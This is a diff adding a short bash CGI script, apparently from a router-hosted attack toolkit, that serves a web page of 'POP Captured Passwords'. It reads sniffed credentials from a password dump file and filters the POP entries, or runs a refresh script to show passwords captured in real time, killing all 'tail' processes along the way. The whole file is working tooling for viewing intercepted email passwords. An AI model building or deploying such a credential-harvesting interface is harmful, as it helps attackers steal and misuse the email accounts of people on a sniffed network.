@@ -1,0 +1,18 @@
+#!/bin/bash
+echo "Content-type: text/html"
+echo ""
+
+echo "<html><head><title>POP Captured Passwords</title></head>"
+
+fcd=$(cat /www/cgi-bin/sword/network/sniffer/fc.txt)
+
+if [ $fcd -eq "0" ]; then 
+echo "Offline POP Passwords"
+echo "<pre>$( cat /www/cgi-bin/sword/network/sniffer/passworddumps.txt | grep POP)</pre>"
+else
+echo "Real-time POP Passwords"
+killall -9 tail
+/www/cgi-bin/sword/network/sniffer/poprefresh
+fi
+
+echo "</body></html>"
